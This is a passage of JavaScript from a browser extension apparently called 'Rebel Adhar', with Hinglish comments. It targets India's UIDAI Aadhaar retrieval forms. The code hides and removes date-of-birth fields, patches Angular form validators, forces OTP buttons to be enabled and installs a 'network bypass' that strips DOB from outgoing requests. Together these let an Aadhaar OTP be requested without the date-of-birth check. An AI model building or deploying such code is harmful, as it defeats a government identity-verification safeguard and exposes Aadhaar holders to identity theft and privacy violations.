      input.setCustomValidity('');
      const box = fieldContainer(input);
      if (box) disableDobDom(box);
    });
    clearDobValuesOnly(log);
    log?.('info', 'DOB bypass applied', { blocks: blocks.length, inputs: getDobInputs().length });
    return { blocks: blocks.length };
  }

  function isDobHidden(uiSel) {
    const inputs = getDobInputs();
    if (!inputs.length) return true;
    return !inputs.some((i) => isVisible(i, uiSel) && !i.closest('[data-rebel-dob-hidden],[data-rebel-dob-off]'));
  }

  function isDobDisabled(uiSel) {
    if (isDobHidden(uiSel)) return true;
    const inputs = getDobInputs();
    if (!inputs.length) return true;
    return inputs.every((i) => i.disabled || i.closest('[data-rebel-dob-off],[data-rebel-dob-hidden]'));
  }

  function leafClickable(el) {
    if (!el) return null;
    let cur = el;
    while (cur && cur !== document.body) {
      const tag = (cur.tagName || '').toLowerCase();
      if (tag === 'a' || tag === 'button') return cur;
      if (cur.getAttribute('role') === 'button' || cur.getAttribute('role') === 'link') return cur;
      if (cur.onclick || cur.getAttribute('ng-reflect-router-link')) return cur;
      if (cur.classList?.contains('uidai-or-link') || cur.classList?.contains('or-link')) return cur;
      const blob = norm(cur.textContent || '');
      if (blob.length < 55 && isOrLinkText(blob)) {
        const st = getComputedStyle(cur);
        if (st.cursor === 'pointer' || st.textDecorationLine?.includes('underline') || tag === 'span') return cur;
      }
      cur = cur.parentElement;
    }
    return el;
  }

  function isOrLinkText(text) {
    const t = norm(text);
    if (t.length < 5 || t.length > 60) return false;
    if (!/\bor\b/.test(t)) return false;
    if (/date of birth|enter captcha|enter name|जन्म/i.test(t)) return false;
    if ((t.match(/\benter\b/g) || []).length > 2) return false;
    if (/mobile|phone|मोबाइल/i.test(t) && /e-?mail|email/i.test(t) && t.length > 34) return false;
    return (
      /\bor\s*(enter\s*)?(e-?mail|email)(\s*(address|id|no\.?))?\b/i.test(t) ||
      /\bor\s*(enter\s*)?(mobile|phone)(\s*(number|no\.?))?\b/i.test(t) ||
      /\bor\s*(e-?mail|mobile|phone)\b/i.test(t)
    );
  }

  /** UIDAI live: sirf "Enter Email Address" (bina OR) bhi hota hai */
  function isToggleText(text, el) {
    const t = norm(text);
    if (isOrLinkText(t)) return true;
    if (t.length < 5 || t.length > 45) return false;
    if (isFormLabel(el)) return false;
    if (/date of birth|enter captcha|enter name|जन्म|as per aadhaar/i.test(t)) return false;
    if (/^enter\s*(e-?mail|email)(\s*(address|id))?$/i.test(t)) return true;
    if (/^enter\s*(mobile|phone)(\s*(number|no))?$/i.test(t) && isLinkish(el)) return true;
    if (/या\s*(ईमेल|मोबाइल)/i.test(t) || /(email|mobile)\s*instead/i.test(t)) return true;
    return false;
  }

  function kindFromOrText(text) {
    const t = norm(text);
    if (/e-?mail|email|ईमेल/i.test(t)) return 'email';
    if (/mobile|phone|मोबाइल/i.test(t)) return 'mobile';
    return 'other';
  }

  function xpathOrLinks(uiSel) {
    const out = [];
    const seen = new Set();
    try {
      const snap = document.evaluate(
        "//*[self::a or self::button or self::span or self::div][contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'or enter') or contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'enter email') or contains(translate(normalize-space(.), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'enter mobile')]",
        document,
        null,
        XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,
        null
      );
      for (let i = 0; i < snap.snapshotLength; i++) {
        const el = snap.snapshotItem(i);
        const text = norm(el.innerText || el.textContent || '');
        if (!isToggleText(text, el)) continue;
        const click = leafClickable(el);
        if (!click || seen.has(click) || !isInDom(click, uiSel)) continue;
        seen.add(click);
        out.push({ el: click, text, kind: kindFromOrText(text) });
      }
    } catch (_e) {}
    return out;
  }

  function discoverOrLinks(uiSel) {
    const found = [];
    const seen = new Set();
    const seenText = new Set();

    function add(el, raw) {
      if (!el || seen.has(el)) return;
      const text = norm(raw || el.innerText || el.textContent || '');
      if (!isToggleText(text, el)) return;
      const click = leafClickable(el);
      if (!click || seen.has(click)) return;
      if (!isInDom(click, uiSel)) return;
      const kind = kindFromOrText(text);
      const dedupeKey = kind + ':' + text;
      if (seenText.has(dedupeKey)) return;
      seenText.add(dedupeKey);
      seen.add(click);
      found.push({ el: click, text, kind });
    }

    const sel =
      'a, button, span, div, p, mat-hint, [matSuffix], [matsuffix], [role="button"], [role="link"], .uidai-or-link, .or-link, [class*="or-link"], [class*="or_link"], [class*="link"], [class*="toggle"], [class*="suffix"]';
    qAll(sel).forEach((el) => add(el));

    findDobBlocks().forEach((block) => {
      block.querySelectorAll(sel).forEach((el) => add(el));
    });

    qAll('mat-form-field, .mat-mdc-form-field').forEach((mff) => {
      mff.querySelectorAll(sel).forEach((el) => add(el));
    });

    qAll('*').forEach((el) => {
      if ((el.children?.length || 0) > 5) return;
      add(el);
    });

    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    let node;
    while ((node = walker.nextNode())) {
      const t = norm(node.textContent || '');
      if (!t || t.length > 50) continue;
      if (!/\bor\b|enter\s*(e-?mail|email|mobile)/i.test(t)) continue;
      let cur = node.parentElement;
      for (let i = 0; i < 5 && cur; i++, cur = cur.parentElement) {
        add(cur, cur.innerText || cur.textContent);
      }
    }

    xpathOrLinks(uiSel).forEach((hit) => {
      if (!seen.has(hit.el)) {
        seen.add(hit.el);
        found.push(hit);
      }
    });

    const order = { email: 0, mobile: 1, other: 2 };
    found.sort((a, b) => {
      const d = (order[a.kind] ?? 9) - (order[b.kind] ?? 9);
      if (d) return d;
      return a.text.length - b.text.length;
    });
    return found;
  }

  function findOrEmailLink(uiSel) {
    return discoverOrLinks(uiSel).find((l) => l.kind === 'email')?.el || null;
  }

  function findOrMobileLink(uiSel) {
    return discoverOrLinks(uiSel).find((l) => l.kind === 'mobile')?.el || null;
  }

  function simulateClick(el) {
    if (!el) return;
    try {
      el.scrollIntoView?.({ block: 'center', inline: 'nearest', behavior: 'instant' });
    } catch (_e) {}
    el.focus?.();
    const o = { bubbles: true, cancelable: true, view: window };
    ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click'].forEach((type) => {
      el.dispatchEvent(new MouseEvent(type, o));
    });
    el.click?.();
  }

  function waitMs(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async function clickToggle(link, log) {
    if (!link?.el) return;
    log?.('info', 'UIDAI mode click', link.text);
    simulateClick(link.el);
    await waitMs(1500);
  }

  async function tryUidaiModeSwitch(uiSel, log) {
    if (isDobBypassed(uiSel)) return true;

    if (shouldSkipEmailToggle(uiSel)) {
      log?.('info', 'Mode switch skip — mobile filled + DOB bypassed', {});
      softHideEmailOnly(log, uiSel);
      return true;
    }

    const links = discoverOrLinks(uiSel);
    log?.('info', 'OR links scan', links.map((l) => l.text));

    if (!links.length) {
      const sample = norm(document.body?.innerText || '').slice(0, 320);
      log?.('warn', 'OR toggle not found', { sample });
      return false;
    }

    const email = links.find((l) => l.kind === 'email');
    const mobile = links.find((l) => l.kind === 'mobile');

    if (email) {
      await clickToggle(email, log);
      if (isDobBypassed(uiSel)) return true;
      await waitMs(800);
    }

    const mobileAfter = discoverOrLinks(uiSel).find((l) => l.kind === 'mobile') || mobile;
    if (mobileAfter) {
      await clickToggle(mobileAfter, log);
      if (isDobBypassed(uiSel)) return true;
    }

    const mobileLabel = discoverOrLinks(uiSel).find(
      (l) => l.kind === 'mobile' || /enter\s*mobile/i.test(l.text)
    );
    if (mobileLabel && mobileLabel !== mobileAfter) {
      await clickToggle(mobileLabel, log);
      if (isDobBypassed(uiSel)) return true;
    }

    if (!email && mobile) {
      await clickToggle(mobile, log);
      if (isDobBypassed(uiSel)) return true;
    }

    return links.length > 0;
  }

  function runModeSwitchRetry(uiSel, log, times) {
    let chain = Promise.resolve();
    const n = Math.min(times || 3, 3);
    for (let i = 0; i < n; i++) {
      chain = chain.then(() => tryUidaiModeSwitch(uiSel, log)).then(() => {
        if (isDobBypassed(uiSel)) return false;
        removeDobFromDom(uiSel, log);
        if (isDobBypassed(uiSel)) return false;
        return waitMs(900);
      });
    }
    return chain;
  }

  function startBypassPoller(uiSel, log, on) {
    if (bypassPoller) clearInterval(bypassPoller);
    if (!on) return;
    let n = 0;
    bypassPoller = setInterval(() => {
      n += 1;
      if (n > 24 || isDobBypassed(uiSel)) {
        clearInterval(bypassPoller);
        bypassPoller = null;
        return;
      }
      if (isDobBypassed(uiSel)) return;
      tryUidaiModeSwitch(uiSel, log).then(() => {
        if (!isDobBypassed(uiSel)) advancedBypass(uiSel, log);
      });
    }, 2500);
  }

  function startWatcher(uiSel, log, on) {
    if (dobWatcher) dobWatcher.disconnect();
    if (watchTimer) clearTimeout(watchTimer);
    if (!on) return;
    dobWatcher = new MutationObserver(() => {
      if (watchTimer) return;
      watchTimer = setTimeout(() => {
        watchTimer = null;
        if (isDobBypassed(uiSel)) return;
        advancedBypass(uiSel, log);
      }, 500);
    });
    dobWatcher.observe(document.documentElement, { childList: true, subtree: true, attributes: true });
  }

  function apply(uiSel, log) {
    startWatcher(uiSel, log, true);
    startBypassPoller(uiSel, log, true);
    fixAngularValidators(log);
    return runModeSwitchRetry(uiSel, log, 6).then(() => {
      return new Promise((resolve) => {
        setTimeout(() => {
          const adv = advancedBypass(uiSel, log);
          if (!adv.dobBypassed) {
            log?.('warn', 'DOB abhi dikhe — Bypass DOB dubara dabao', adv);
          } else {
            log?.('info', 'DOB bypass OK — form ready (bina DOB)', { dobVisible: adv.dobVisible });
          }
          const diag = getFormDiagnostics(uiSel);
          const state = {
            dobBypassed: isDobBypassed(uiSel),
            dobInForm: getDobInputs().length,
            dobVisible: dobFieldVisible(uiSel),
            formOk: isFormReadyForOtp(uiSel),
            diag,
          };
          log?.('info', 'Rebel Adhar ready', state);
          resolve(state);
        }, 1600);
      });
    });
  }

  function enableOtpButtons() {
    if (isReactSite()) enableReactOtpButton();
    qAll('button, [role="button"], input[type="submit"]').forEach((btn) => {
      const t = norm(btn.textContent || btn.value || '');
      if (!t.includes('send otp') && !t.includes('request otp')) return;
      btn.disabled = false;
      btn.removeAttribute('disabled');
      btn.classList.remove('mat-button-disabled', 'mat-mdc-button-disabled', 'disabled');
      btn.style.pointerEvents = 'auto';
    });
  }

  function buildSubmitState(uiSel, log, opts) {
    const after = getFormDiagnostics(uiSel);
    const bypassed = isDobBypassed(uiSel);
    const state = {
      dobBypassed: bypassed,
      dobInForm: getDobInputs().length,
      after,
      formOk: isFormReadyForOtp(uiSel),
    };
    if (!opts?.quiet) log?.('info', 'Send OTP prep', state);
    if (!bypassed) {
      log?.('error', 'DOB bypass fail — Bypass DOB dabao (DOB mat bharo)', {
        dobInForm: state.dobInForm,
        dobVisible: after.dobVisible,
        orLinks: after.orLinks,
      });
    } else if (!state.formOk) {
      const miss = (after.fields || []).filter(
        (f) => (f.type === 'name' || f.type === 'mobile' || f.type === 'captcha') && !f.ok
      );
      log?.('error', 'Fill missing', miss.length ? miss : after.fields);
    }
    return state;
  }

  /** OTP prep — mode switch + DOB neutralize; fake date KABHI NAHI */
  function prepareSubmit(uiSel, log) {
    advancedBypass(uiSel, log);
    return buildSubmitState(uiSel, log);
  }

  /** Mode switch + fallback neutralize */
  async function ensureDobBypassed(uiSel, log, tries) {
    if (isDobBypassed(uiSel)) return true;
    const n = Math.min(tries || 4, 4);
    for (let i = 0; i < n; i++) {
      await tryUidaiModeSwitch(uiSel, log);
      if (isDobBypassed(uiSel)) return true;
      removeDobFromDom(uiSel, log);
      if (isDobBypassed(uiSel)) return true;
      await waitMs(700);
    }
    await advancedBypassAsync(uiSel, log);
    return isDobBypassed(uiSel);
  }

  async function prepareSubmitAsync(uiSel, log) {
    await ensureDobBypassed(uiSel, log, 4);
    await advancedBypassAsync(uiSel, log);
    return buildSubmitState(uiSel, log);
  }

  function formReady() {
    return qAll('input:not([type="hidden"])').length >= 3;
  }

  function waitForForm(timeout) {
    return new Promise((resolve) => {
      if (formReady()) return resolve(true);
      const deadline = Date.now() + (timeout || 25000);
      const obs = new MutationObserver(() => {
        if (formReady()) {
          obs.disconnect();
          resolve(true);
        }
      });
      obs.observe(document.documentElement, { childList: true, subtree: true });
      const tick = setInterval(() => {
        if (formReady()) {
          clearInterval(tick);
          obs.disconnect();
          resolve(true);
        } else if (Date.now() > deadline) {
          clearInterval(tick);
          obs.disconnect();
          resolve(false);
        }
      }, 400);
    });
  }

  function stopWatcher() {
    if (dobWatcher) dobWatcher.disconnect();
    dobWatcher = null;
    if (bypassPoller) clearInterval(bypassPoller);
    bypassPoller = null;
  }

  function dobFieldVisible(uiSel) {
    return getDobInputs().some((i) => isVisible(i, uiSel) && !i.closest('[data-rebel-dob-hidden]'));
  }

  return {
    ENGINE_VERSION,
    detectFramework,
    isReactSite,
    setReactInputValue,
    syncReactInputs,
    patchReactFormValues,
    enableReactOtpButton,
    neutralizeReactDob,
    patchReactOtpClick,
    reactGenerateOtpSend,
    reactGenerateOtpFetch: reactGenerateOtpSend,
    getReactFiber,
    getReactProps,
    findReactFormWrapper,
    findReactPageFiber,
    norm,
    DISABLED_MARK,
    HIDDEN_MARK,
    hideDob,
    disableDob,
    patchAngularForms,
    getFormDiagnostics,
    isFormReadyForOtp,
    isDobBypassed,
    quickModeSwitch,
    discoverOrLinks,
    getFieldSnapshot,
    ensureMobileModeSync,
    neutralizeEmail,
    softHideEmailOnly,
    ensureUidaiMobileMode,
    shouldSkipEmailToggle,
    readInputVal,
    isDobHidden,
    isDobDisabled,
    dobFieldVisible,
    apply,
    buildSubmitState,
    buildOtpPayload,
    buildRetrievePayloads,
    prepareOtpLight,
    prepForUserOtp,
    findOtpButton,
    syncAngularInputs,
    syncNgControlsFromDom,
    findNgControlFromElement,
    fixAngularValidators,
    patchAngularControlValues,
    invokeViaPageHttp,
    prepareSubmit,
    prepareSubmitAsync,
    ensureDobBypassed,
    formReady,
    waitForForm,
    getMatFields,
    classifyField,
    stopWatcher,
    neutralizeDobControls,
    removeDobFromDom,
    clearDobValuesOnly,
    advancedBypass,
    advancedBypassAsync,
    forceSubmitOtp,
    triggerAngularOtp,
    deepInvokeOtp,
    scrapeChunkEndpoints,
    directOtpRequest,
    invokeOtpPipeline,
    installNetworkBypass,
    isUidaiOtpHit,
    stripDobDeep,
    stripDobFromBody,
  };
});

/**
 * PAGE context — DOB bypass only. OTP = user khud dabata hai, zero interference.
 */
(function () {
  if (window.__rebelPageBridge) return;
  window.__rebelPageBridge = true;

  const E = window.UidaiRetrieveEngine;
  if (!E) return;

  const KEY = 'rebelAdharOn';
  const UI_SEL =
    '#rebel-adhar-log-panel,#rebel-fab,#rebel-switch-btn,#rebel-logs-btn,#rebel-debug-btn,#rebel-status-strip';

  let uidaiOkCount = 0;
  let prepTimer = null;

  function isOn() {
    try {
      return localStorage.getItem(KEY) === '1';
    } catch (_e) {
      return false;
    }
  }

  function emit(level, msg, data) {
    try {
      window.postMessage({ rebel: 1, type: 'log', level: level, msg: msg, data: data }, '*');
    } catch (_e) {}
    console.log('[Rebel Adhar PAGE]', level, msg, data ?? '');
  }

  E.installNetworkBypass({
    log: emit,
    enabled: isOn,
    onSuccess: function (kind, method, url, status) {
      if (!isOn()) return;
      uidaiOkCount += 1;
      emit('req', kind + ' ' + method + ' ' + status, String(url || '').slice(0, 120));
      emit('info', 'OTP sent — UIDAI ' + status, { url: String(url || '').slice(0, 80) });
    },
  });

  function runPrep() {
    if (!isOn() || !E.isDobBypassed?.(UI_SEL)) return;
    if (E.prepForUserOtp) E.prepForUserOtp(UI_SEL, emit);
    else if (E.prepareOtpLight) E.prepareOtpLight(UI_SEL, emit);
  }

  function onFieldInput(e) {
    if (!isOn() || !E.isDobBypassed?.(UI_SEL)) return;
    const input = e.target?.closest?.('input, textarea');
    if (!input || input.type === 'hidden') return;
    if (E.syncNgControlsFromDom) E.syncNgControlsFromDom(emit);
  }

  function startPrepLoop() {
    if (prepTimer) clearInterval(prepTimer);
    prepTimer = setInterval(runPrep, 2500);
    runPrep();
  }

  function stopPrepLoop() {
    if (prepTimer) clearInterval(prepTimer);
    prepTimer = null;
  }

  function bootPage() {
    if (!isOn()) {
      stopPrepLoop();
      return;
    }
    emit('info', 'Rebel PAGE v' + E.ENGINE_VERSION + ' — ' + (E.detectFramework ? E.detectFramework() : 'page') + ' — khud Send OTP dabao');
    E.waitForForm(30000).then(function (ready) {
      if (!ready) {
        emit('warn', 'Form timeout — page reload karo');
        return;
      }
      return E.apply(UI_SEL, emit).then(function () {
        const bypassed = E.isDobBypassed(UI_SEL);
        emit('info', bypassed ? 'DOB bypass OK — ab khud Send OTP dabao' : 'Bypass DOB dabao', {
          dobVisible: E.dobFieldVisible(UI_SEL),
          orLinks: E.discoverOrLinks ? E.discoverOrLinks(UI_SEL).map(function (l) { return l.text; }) : [],
        });
        if (bypassed) startPrepLoop();
      });
    });
  }

  window.addEventListener('message', function (e) {
    if (!e.data || e.data.rebel !== 1 || e.data.type !== 'cmd') return;
    if (e.data.cmd === 'boot') bootPage();
    if (e.data.cmd === 'apply') {
      E.apply && E.apply(UI_SEL, emit);
      runPrep();
    }
    if (e.data.cmd === 'diag') {
      const d = E.getFormDiagnostics ? E.getFormDiagnostics(UI_SEL) : {};
      window.postMessage({ rebel: 1, type: 'diag', id: e.data.id, data: d }, '*');
    }
  });

  document.addEventListener('input', onFieldInput, true);
  document.addEventListener('change', onFieldInput, true);

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bootPage);
  } else {
    bootPage();
  }
})();
